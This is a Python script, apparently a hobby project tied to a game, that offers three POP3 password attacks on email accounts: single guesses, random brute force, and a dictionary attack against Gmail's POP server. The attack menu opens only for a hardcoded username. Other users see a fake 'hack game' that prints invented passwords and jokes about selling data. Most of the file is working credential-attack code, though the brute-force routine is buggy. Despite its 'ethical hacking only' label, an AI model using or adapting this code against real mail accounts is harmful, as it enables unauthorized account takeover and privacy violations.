import time,poplib,random
from os import system
from random import randint
from BetaModameGame import *

"""
REDACTED.py

Used for ethical hacking purposes only!!!

Brute force: Poplib version
Guess = Poplib version
Dictionary = file + Poplib version
"""




def Guess_hack(Person):
    person = input("emailID:")
    Pass = input("Password:")
    Site = input("site(with pop):")
    try:
        web = poplib.POP3_SSL(Site)
        web.user(person)
        web.pass_(Pass)
    except:
        print(Exception)
        print("Did not work")
        input()
        system("cls")
        REDACTEDTransportation(Person)
    else:
        print("worked, password is:",Pass)
        input()
        system("cls")
        REDACTEDTransportation(Person)

def BruteForce(Person):
    numbers = ["1","2","3","4","5","6","7","8","9","0"]
    letters = ["q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c" \
    "v","b","n","m"]
    other = ["_"]
    chars = numbers + letters + other
    Server = "pop.gmail.com"
    user = input("which email?")
    type_password = input("type: \n [1]all \n [2]numbers \n [3]letters")

    if "num" in type_password:
        type_password = numbers
    elif "all" in type_password:
        type_password = chars

    elif "letters" in type_password:
        type_password = letters
    else:
        print("didn't understand")
        REDACTEDTransportation(Person)
    Digits = input("Length:")

    def BruteForce(Server,email,type_password,Digits):




        if CheckValue(Digits):
            length_start = int(Digits)
            length_finish = int(Digits)
            length = int(Digits)
            Password =  [random.choice(type_password) for _ in range(int(Digits))]
            try:
                web = poplib.POP3_SSL(Server)
                web.user(email)
                web.pass_(Password)

            except:
                print("try:",Password)
                BruteForce(Server,email,type_password,Digits)
            else:
                print("Password:",Password)
                REDACTEDTransportation(Person)

        else:
            print("did not understand")
            REDACTEDTransportation(Person)


    BruteForce(Server,user,type_password,Digits)

def REDACTEDTransportation(User):
    if User == 'hellom38':
        user = input('[1] Bruteforce\n[2] Guess\n[3] dictionary attack\n[4] exit\n')

        if "1" in user:
            BruteForce(User)
        elif "2" in user:
            Guess_hack(User)

        elif "3" in user:
            mailServer = 'pop.gmail.com'

            emailID =input('Enter Email ID: ')
            passfile =input('Enter Password File location: ')

            def hit(email,Pass):
                try:
                    myEmailConnection = poplib.POP3_SSL(mailServer)
                    myEmailConnection.user(email)
                    myEmailConnection.pass_(Pass)
                except:
                    print('Trying: '+Pass)
                    return False
                else:
                    print('Password Found: '+Pass)
                    return True

            f=open(passfile)
            for i in f:
                if(hit(emailID,i)):
                    system("cls")
                    REDACTEDTransportation(User)
            input()
            system("cls")
            REDACTEDTransportation(User)

        elif "4" in user:
            transportationZone(User)
        else:
            print("did not understand")
            time.sleep( 2 )
            system("cls")
            REDACTEDTransportation(User)




    else:
        number_value = randint(0,300000000000)
        list_food = ['potato', 'tomato', 'food', 'orange']
        list_color = ['red', 'green', 'yellow', 'orange', 'gold']
        user = input('Welcome to the hack game,\nwhat user? ')
        time.sleep( 2 )
        print('starting hack')
        time.sleep( 3 )
        print(str(user) + ' has been hacked, his password is, ' + str(random.choice(list_food)) + str(random.choice(list_color)) + str(number_value))
        time.sleep( 3 )
        print('Selling data to russian Hackers')
        print('.....')
        time.sleep( 2 )
        print('the totally real hack has been completed')
        time.sleep( 2 )
        system("cls")
        transportationZone(User)
